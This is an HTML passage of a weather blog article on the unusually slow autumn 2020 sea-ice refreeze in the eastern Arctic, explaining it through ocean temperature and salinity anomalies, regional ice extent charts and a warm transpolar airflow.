<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png" data-image-id="20126" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png-nggid0520126-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png-nggid0520126-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png" data-image-id="20150" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png-nggid0520150-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png-nggid0520150-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<h5><span><strong>THE VAST ARCTIC OCEAN</strong></span></h5>
<p>The Arctic region is in fact entirely an ocean and has no large-scale landmass. It is the smallest and shallowest of the world’s five major oceans, and also the coldest. It is also the only ocean smaller than the largest country in the world by area, Russia.</p>
<p>The image below shows the Arctic ocean, as it would look without water, revealing a very complex underwater terrain. To understand the current unusual sea ice anomalies, we need to understand the ocean where all the ice floats on. More specifically, we need to understand the state of the ocean in its eastern region, in the Kara Sea, Siberian Sea, and the Laptev Sea. The image below shows these regions in the Arctic Ocean, found on the side opposite to Greenland. The graphic is from one of the more recent Arctic Ocean <a href="https://www.researchgate.net/publication/314163132_New_constraints_on_Arctic_Ocean_Mn_stratigraphy_from_radiocarbon_dating_on_planktonic_foraminifera">studies</a>.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg" data-image-id="20161" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg-nggid0520161-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry" width="626" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20626%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg-nggid0520161-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>The image below is probably the most important one so far, as it shows the ocean surface temperature anomaly. It shows the ocean temperatures are currently well above normal around the entire Arctic ice sheet. Anomalies of over 2-3 degrees Celsius can be found across all the 3 critical ocean regions we mentioned above.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png" data-image-id="20145" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png-nggid0520145-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png-nggid0520145-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Compared to this time last year, the Atlantic side is actually colder this year, while the eastern Arctic Ocean is obviously much warmer than it was this time last year.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png" data-image-id="20147" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png-nggid0520147-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png-nggid0520147-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Also looking at the raw temperatures, we can see the eastern Arctic ocean is actually in positive surface temperatures, which means a low to zero chance of freezing over at this point. In normal conditions, almost the entire Arctic ocean should be at or below the freezing point – 0°C (black color) by the end of October.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png" data-image-id="20144" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png-nggid0520144-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png-nggid0520144-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>When comparing the current ice concentration and thickness with the lowest ice extent in mid-September, we can see the growth on the edges. But towards Siberia, we can actually see a reduced concentration and reduced thickness (red colors). Ocean and air temperatures were not yet right to allow rapid refreeze towards Siberia at present time.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png" data-image-id="20156" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png-nggid0520156-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png-nggid0520156-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png" data-image-id="20157" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png-nggid0520157-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png-nggid0520157-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>But temperature is not the only factor here. <span><strong>Ocean salinity</strong></span> also plays a big role in the production of ice. The saltier the water, the colder it needs to get for ice to form. Think of salt being used on the roads to prevent ice buildup.</p>
<p>The image below shows the Arctic ocean salinity, where we can see the fresher water in blue colors, and saltier waters in brownish hues. Transport of saltier water is obvious from the North Atlantic into the Arctic Ocean, specifically towards the eastern parts. Interestingly, we can see the dark colors around the coastal areas, which is very fresh water. That is the freshwater discharge from the Siberian rivers.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png" data-image-id="20143" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png-nggid0520143-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png-nggid0520143-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>We produced a short but very cool high-resolution video animation, which shows the Arctic ocean salinity in the past 5 months. You can see the <span><strong>ocean circulation</strong></span>, <strong><span>ocean currents,</span></strong> and the <strong><span>saltier water transport</span></strong> from the North Atlantic. Also note the freshwater entering the Arctic from the Siberian side, as the rivers discharge into the ocean, and note the freshwater increase during Summer, as melting ice makes the surface waters fresher.</p>


<h5><span><strong>SEA ICE ACROSS REGIONS</strong></span></h5>
<p>Many regions have regained ice since the lowest point in mid-September. But as we have shown above, the east Arctic Ocean is unusually warm and prevents fast sea-ice expansion.</p>
<p>The image below shows the sea ice extent by various regions across the Arctic. While some regions normally start the freezing at a later date, there are 3 regions that stand out, as they should be much higher than they currently are. The <strong><span>Siberian Sea</span></strong> region, the <span><strong>Kara Sea</strong></span>, and the <span><strong>Laptev Sea</strong></span>. These are the regions that we have highlighted higher up in the article, which also face the biggest temperature anomalies.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png" data-image-id="20139" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png-nggid0520139-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png-nggid0520139-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Looking at the Siberian Arctic region, it is struggling to increase the ice extent. It is running really unusually low for this time of year, having just a few % of the normal sea ice extent expected for this date.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg" data-image-id="20154" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg-nggid0520154-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg-nggid0520154-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>And of course, the Laptev Sea, which has been at record low levels for quite some time now. In the previous decade, the Laptev Sea has been entirely frozen over by this time of year, while this year it simply cannot lift off the ground.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg" data-image-id="20162" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg-nggid0520162-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg-nggid0520162-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>But what is causing this unusual situation in the eastern Arctic Ocean? We have seen the ocean temperature anomalies and ocean salinity. But what has brought the Arctic Ocean into this state? Part of the answer lies in the Atmosphere, which is where we are heading next.<br>
&nbsp;</p>
<h5><span><strong>FROM THE OCEAN TO THE ATMOSPHERE</strong></span></h5>
<p>In the atmosphere, we usually always start with the temperatures. Looking at the January-September period, we can see that a hotspot has developed right over Siberia and the eastern Arctic Ocean. We can see a large area of temperatures 4-5°C above the long term average. We wrote about these <a href="https://www.severe-weather.eu/global-weather/arctic-circle-high-pressure-warming-fa/">Arctic heatwaves</a>, which were ongoing since Spring.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg" data-image-id="20138" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg-nggid0520138-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg-nggid0520138-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>A closer look at the August-September period reveals an even stronger hotspot, now expanded further into the Arctic Ocean, as the sea ice melted and more open water was exposed to the warmer weather.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png" data-image-id="20125" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png-nggid0520125-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png-nggid0520125-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The reason behind this anomaly was a very specific pressure pattern. The October analysis so far, shows the high-pressure area dominating the Arctic region, while we can see a low-pressure system over the Siberian side.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif" data-image-id="20163" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif-nggid0520163-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.gif" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E">
</a>
</p>
<p>Such a pattern creates a very unique transpolar airflow over the eastern Arctic Ocean. The image below shows the average low-level wind flow in October so far. We can see the air transport across the Arctic, as warmer air enters the Arctic from one side, and cooler air leaving out on the other side.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png" data-image-id="20153" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png-nggid0520153-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png-nggid0520153-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Looking at temperature anomalies in October so far, we can actually see a massive warm anomaly across the Siberian Arctic. That is where the warmer air was entering the region, replacing the colder air moving out into western Siberia.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png" data-image-id="20132" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png-nggid0520132-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png-nggid0520132-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The past 10 days specifically, have seen anomalies in excess of 15°C across the Siberian Arctic ocean. This, together with the warmer ocean waters, has been a large ice growth inhibitor so far in October.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png" data-image-id="20149" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast" data-description="" target="_self">
